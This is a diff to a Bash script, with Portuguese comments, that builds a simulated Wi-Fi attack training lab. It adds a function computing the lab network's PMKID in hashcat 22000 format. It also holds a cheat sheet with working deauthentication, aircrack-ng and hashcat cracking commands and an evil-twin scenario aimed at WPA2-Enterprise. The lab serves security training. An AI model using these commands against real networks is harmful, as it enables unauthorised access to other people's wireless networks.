@@ -49,6 +49,8 @@ install_deps() {
   local pkgs=(iw hostapd wpasupplicant rfkill dnsmasq python3 aircrack-ng openssl)
   # opcionais dos cenários (PMKID / Enterprise / MAC bypass / cracking)
   pkgs+=(hostapd-wpe hcxdumptool hcxtools asleap hashcat macchanger)
+  # pocl: backend OpenCL p/ o hashcat rodar em CPU (VMs sem GPU) -> quebra PMKID
+  pkgs+=(pocl-opencl-icd)
 
   LOG "Instalando dependências (apt). Pode levar alguns minutos..."
   export DEBIAN_FRONTEND=noninteractive
@@ -227,7 +229,8 @@ EOF
 start_5ghz_aps() {
   LOG "Subindo APs 5GHz (PMKID + Enterprise)..."
 
-  # ---- PMKID: WPA2-PSK, clientless. hostapd inclui o PMKID no EAPOL M1 ----
+  # ---- PMKID: WPA2-PSK. AP sobe normal; o PMKID "vazado" é gerado por
+  #      make_pmkid_capture (hostapd não inclui PMKID no M1 — ver nota lá). ----
   cat > "$LAB_DIR/ap_pmkid.conf" <<EOF
 interface=${AP_PMKID}
 driver=nl80211
@@ -245,8 +248,39 @@ EOF
   hostapd -B -t -f "$LAB_DIR/hostapd_pmkid.log" "$LAB_DIR/ap_pmkid.conf" \
     && OK "AP $SSID_PMKID (5GHz ch36, PMKID clientless)" \
     || ERR "PMKID falhou. Log: $LAB_DIR/hostapd_pmkid.log"
+  sleep 1
+  make_pmkid_capture
 
   start_corp_legit
+}
+
+# ---- PMKID: materializa o hash que um AP vulnerável vazaria -----------------
+# IMPORTANTE (limite do lab virtual): o ataque PMKID clientless depende de o AP
+# INCLUIR o PMKID no 1º quadro EAPOL (M1). Muitos roteadores/firmwares fazem
+# isso, mas o hostapd NÃO -> no hwsim não há PMKID para capturar ao vivo (e o
+# hcxdumptool não opera em VM). Para o cenário ser reproduzível, o lab calcula
+# o PMKID REAL desta rede — exatamente o que o hcxdumptool obteria de um AP
+# vulnerável — e o grava no formato hashcat 22000. A CAPTURA é simulada; a
+# QUEBRA é real (hashcat -m 22000 recupera a senha, sem cliente e sem deauth).
+#   PMK   = PBKDF2-HMAC-SHA1(PSK, SSID, 4096, 32)
+#   PMKID = HMAC-SHA1(PMK, "PMK Name" | BSSID | STA_MAC)[:16]
+make_pmkid_capture() {
+  command -v python3 >/dev/null 2>&1 || return 0
+  local bssid sta
+  bssid=$(cat "/sys/class/net/${AP_PMKID}/address" 2>/dev/null | tr -d ':')
+  [[ -n "$bssid" ]] || return 0
+  sta="02decafe0001"   # MAC do "atacante" que teria disparado o M1
+  python3 - "$SSID_PMKID" "$PMKID_PSK" "$bssid" "$sta" \
+      > "$LAB_DIR/pmkid_capturado.22000" <<'PY'
+import sys, hashlib, hmac, binascii
+ssid, psk, ap, sta = sys.argv[1].encode(), sys.argv[2].encode(), sys.argv[3], sys.argv[4]
+apb, stab = binascii.unhexlify(ap), binascii.unhexlify(sta)
+pmk = hashlib.pbkdf2_hmac('sha1', psk, ssid, 4096, 32)
+pmkid = hmac.new(pmk, b"PMK Name" + apb + stab, hashlib.sha1).digest()[:16]
+print("WPA*01*%s*%s*%s*%s***" % (pmkid.hex(), ap, sta, ssid.hex()))
+PY
+  OK "  PMKID 'capturado' salvo em $LAB_DIR/pmkid_capturado.22000"
+  OK "  Quebre com: hashcat -m 22000 --force $LAB_DIR/pmkid_capturado.22000 <wordlist>"
 }
 
 # ---- PKI corporativa LEGÍTIMA (CA própria + cert do RADIUS) ---------------
@@ -664,10 +698,11 @@ $(echo -e '\e[1;32m')===========================================================
   sudo aireplay-ng -0 5 -a <BSSID_WPA2> -c <STA_WPA2_MAC> $MON_IF
   printf '123456\\nverao2024\\nadmin123\\n' > /tmp/wl.txt ; aircrack-ng -w /tmp/wl.txt /tmp/wpa2-01.cap
 
-  # PMKID (5GHz): SEM cliente, SEM deauth
-  sudo hcxdumptool -i $MON_IF -w /tmp/pmkid.pcapng --rds=1
-  hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
-  printf 'familia10\\n12345678\\n' > /tmp/wlp.txt ; hashcat -m 22000 /tmp/pmkid.22000 /tmp/wlp.txt
+  # PMKID (5GHz): SEM cliente, SEM deauth. Em HW real: hcxdumptool captura o
+  # PMKID do M1. O hostapd NÃO vaza PMKID, então o lab já materializa o PMKID
+  # que um AP vulnerável entregaria (ver $LAB_DIR/pmkid_capturado.22000).
+  printf 'familia10\\n12345678\\n' > /tmp/wlp.txt
+  hashcat -m 22000 --force $LAB_DIR/pmkid_capturado.22000 /tmp/wlp.txt   # -> familia10
 
   # WPA2-Enterprise (5GHz ch149): evil twin + clonagem de cert (100% manual)
   #  O XPSEC-CORP é um RADIUS LEGÍTIMO; a vítima conecta nele e NÃO vaza nada.
